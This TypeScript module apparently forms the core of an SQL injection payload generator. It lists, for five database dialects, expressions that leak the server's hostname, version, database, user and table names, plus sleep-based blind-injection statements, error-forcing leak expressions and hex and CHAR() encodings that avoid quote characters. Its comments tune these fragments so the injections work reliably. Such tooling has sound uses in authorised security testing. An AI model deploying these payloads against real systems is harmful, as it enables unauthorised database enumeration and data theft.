import { bytesToHex, utf8Bytes } from "../hash/bytes";

export type SqlDialectId = "mysql" | "mssql" | "postgresql" | "oracle" | "sqlite";

export type SqlDialect = {
  id: SqlDialectId;
  label: string;
  lineComment: string;
  concat: (parts: string[]) => string;
  /** A dialect-correct literal glue value between chained info fields, chosen to avoid a quote
   *  character where the dialect genuinely allows it. */
  separatorLiteral: string;
  hostname: string | null;
  version: string;
  currentDatabase: string | null;
  currentUser: string | null;
  listTables: string;
  /** A boolean-context-safe expression usable directly inside `AND <expr>` that also causes a
   *  delay as a side effect. Null where no such expression exists without a fragile subquery hack
   *  (e.g. MSSQL has no inline equivalent to MySQL's SLEEP() usable in a WHERE clause). */
  inlineSleepCondition: ((seconds: number) => string) | null;
  /** A full statement usable after a `;` in a stacked-queries payload. Null where the dialect has
   *  no reliable delay primitive at all (Oracle needs a grant most app accounts lack; SQLite has
   *  no builtin). */
  stackedSleepStatement: ((seconds: number) => string) | null;
  /** A full boolean/throwing expression, ready to embed directly after `AND `, that forces the
   *  engine to raise an error containing `expr`'s value. Null where no reliable trick exists
   *  (Oracle's are too fragile/version-dependent; SQLite's lenient typing rarely errors). */
  errorTrigger: ((expr: string) => string) | null;
  /** Rewrites `text` as a bare hex literal the engine treats as a string value in this position.
   *  Null everywhere except MySQL — MySQL is the only one of the five dialects where a bare hex
   *  literal is treated as a string by default; MSSQL's 0x... is a binary literal that CONCAT()
   *  stringifies to its literal "0x.." text rather than decoding it (the decode-on-concat trick
   *  only works with the `+` operator, which this generator doesn't use — see the CONCAT() vs `+`
   *  note below), and SQLite parses 0x... as a hex *integer*, not a string, in every context. */
  hexStringLiteral: ((text: string) => string) | null;
  /** Rewrites `text` as a CHAR()/CHR()-based reconstruction from character codes. Always
   *  available (every target dialect has some form of this), unlike hexStringLiteral. */
  charFunctionLiteral: (text: string) => string;
  /** Syntax-level support only — whether the *host application's* DB driver/API actually executes
   *  a second statement after a `;` is a separate, unverifiable-from-here concern the UI must
   *  caveat explicitly. */
  supportsStackedQueries: boolean;
};

function codePoints(text: string): number[] {
  return Array.from(text, (ch) => ch.codePointAt(0)!);
}

/** CHAR()/CHR() reconstruction for dialects whose char-code function accepts multiple arguments
 *  and concatenates them itself (MySQL, MSSQL, SQLite). */
function multiArgCharLiteral(fn: string, text: string): string {
  return `${fn}(${codePoints(text).join(",")})`;
}

/** CHR() reconstruction for dialects whose char-code function only accepts a single argument
 *  (PostgreSQL, Oracle) — each character needs its own call, joined with the dialect's concat operator. */
function singleArgCharLiteral(fn: string, text: string): string {
  return codePoints(text)
    .map((c) => `${fn}(${c})`)
    .join("||");
}

export const SQL_DIALECTS: SqlDialect[] = [
  {
    id: "mysql",
    label: "MySQL",
    // A bare "--" is only a comment when followed by whitespace — an unadorned trailing "--" is
    // not parsed as a comment at all, so the trailing space here is significant and must survive
    // untrimmed all the way into the rendered payload.
    lineComment: "-- ",
    concat: (parts) => `CONCAT(${parts.join(",")})`,
    separatorLiteral: "0x3a",
    hostname: "@@hostname",
    version: "@@version",
    currentDatabase: "DATABASE()",
    currentUser: "CURRENT_USER()",
    listTables: "(SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=DATABASE())",
    inlineSleepCondition: (s) => `SLEEP(${s})`,
    stackedSleepStatement: (s) => `SELECT SLEEP(${s})`,
    errorTrigger: (expr) => `EXTRACTVALUE(1,CONCAT(0x7e,(${expr})))`,
    hexStringLiteral: (text) => "0x" + bytesToHex(utf8Bytes(text)),
    charFunctionLiteral: (text) => multiArgCharLiteral("CHAR", text),
    supportsStackedQueries: true,
  },
  {
    id: "mssql",
    label: "MSSQL (SQL Server)",
    lineComment: "--",
    // CONCAT() (2012+) coalesces NULL operands to empty string instead of propagating NULL across
    // the whole expression the way "+" does — more robust when chaining several info fields where
    // any one of them could legitimately come back NULL.
    concat: (parts) => `CONCAT(${parts.join(",")})`,
    separatorLiteral: "':'",
    hostname: "SERVERPROPERTY('MachineName')",
    version: "@@VERSION",
    currentDatabase: "DB_NAME()",
    currentUser: "SYSTEM_USER",
    listTables: "(SELECT STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_catalog=DB_NAME())",
    // No reliable inline boolean-context delay exists in T-SQL without a fragile subquery hack —
    // WAITFOR DELAY is a statement, not an expression usable inside a WHERE clause.
    inlineSleepCondition: null,
    stackedSleepStatement: (s) => `WAITFOR DELAY '00:00:${String(s).padStart(2, "0")}'`,
    errorTrigger: (expr) => `1=CONVERT(int,(${expr}))`,
    // MSSQL's binary literals only decode to text via the "+" operator's implicit conversion —
    // CONCAT() stringifies a binary argument to its literal "0x.." hex text instead of decoding
    // it, so with this generator's CONCAT()-based concat there's no honest hex-literal trick here.
    hexStringLiteral: null,
    charFunctionLiteral: (text) => multiArgCharLiteral("CHAR", text),
    supportsStackedQueries: true,
  },
  {
    id: "postgresql",
    label: "PostgreSQL",
    lineComment: "--",
    concat: (parts) => parts.join(" || "),
    separatorLiteral: "':'",
    // inet_server_addr() returns the server's IP, not a hostname, and returns NULL entirely over
    // a local Unix-socket connection (the common default) — surfaced as a caveat in the info-target description.
    hostname: "inet_server_addr()::text",
    version: "VERSION()",
    currentDatabase: "CURRENT_DATABASE()",
    currentUser: "CURRENT_USER",
    listTables: "(SELECT STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_schema='public')",
    inlineSleepCondition: (s) => `(SELECT 1 FROM PG_SLEEP(${s}))=1`,
    stackedSleepStatement: (s) => `SELECT PG_SLEEP(${s})`,
    errorTrigger: (expr) => `1=CAST((${expr}) AS int)`,
    hexStringLiteral: null,
    charFunctionLiteral: (text) => singleArgCharLiteral("CHR", text),
    supportsStackedQueries: true,
  },
  {
    id: "oracle",
    label: "Oracle",
    lineComment: "--",
    concat: (parts) => parts.join(" || "),
    separatorLiteral: "':'",
    hostname: "UTL_INADDR.get_host_name",
    // Not a bare scalar like the other dialects' VERSION()/@@version — Oracle's version lives in
    // a table, so this is a subquery fragment instead.
    version: "(SELECT banner FROM v$version WHERE ROWNUM=1)",
    currentDatabase: null, // Oracle has no multi-database concept — it's schema/instance-based.
    currentUser: "USER",
    listTables: "(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
    // DBMS_LOCK.SLEEP/DBMS_SESSION.SLEEP need an explicit grant most app-level accounts lack, and
    // the correct package name varies by Oracle version — not safe to hardcode either.
    inlineSleepCondition: null,
    stackedSleepStatement: null,
    // Oracle's error-based leak tricks are fragile and version/permission-dependent — not
    // confidently templated without a specific target version in hand.
    errorTrigger: null,
    hexStringLiteral: null,
    charFunctionLiteral: (text) => singleArgCharLiteral("CHR", text),
    supportsStackedQueries: false, // needs a PL/SQL anonymous block, not plain multi-statement SQL.
  },
  {
    id: "sqlite",
    label: "SQLite",
    lineComment: "--",
    concat: (parts) => parts.join(" || "),
    separatorLiteral: "':'",
    hostname: null, // embedded, file-based — no server/host concept at all.
    version: "sqlite_version()",
    currentDatabase: null, // file-based — no database "name" to report.
    currentUser: null, // no built-in user/auth concept.
    listTables: "(SELECT GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table')",
    inlineSleepCondition: null, // no SLEEP-equivalent builtin in standard SQLite.
    stackedSleepStatement: null,
    errorTrigger: null, // SQLite's lenient dynamic typing rarely raises an error to leak through.
    hexStringLiteral: null, // 0x... is parsed as a hex *integer* in SQLite, never as a string.
    charFunctionLiteral: (text) => multiArgCharLiteral("char", text),
    supportsStackedQueries: true, // via the CLI only — most host-language bindings block it.
  },
];

export const SQL_DIALECTS_BY_ID: Record<SqlDialectId, SqlDialect> = Object.fromEntries(
  SQL_DIALECTS.map((d) => [d.id, d]),
) as Record<SqlDialectId, SqlDialect>;
